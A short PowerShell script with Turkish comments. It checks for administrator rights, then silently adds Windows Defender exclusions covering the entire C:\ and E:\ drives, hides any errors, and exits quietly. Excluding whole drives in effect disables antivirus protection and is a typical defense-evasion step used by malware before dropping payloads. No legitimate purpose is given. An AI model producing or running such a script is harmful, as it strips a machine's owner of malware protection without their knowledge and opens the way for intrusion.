# Yönetici yetkisi kontrolü
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Bu betiği çalıştırmak için yönetici yetkisi gerekiyor." -ForegroundColor Red
    exit
}

# Windows Defender exclusion ekleme
Try {
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "E:\" -ErrorAction SilentlyContinue
} Catch {
    Write-Host "Windows Defender exclusion eklenirken hata oluştu." -ForegroundColor Yellow
}



# Betik tamamlandığında sessizce çıkış
exit
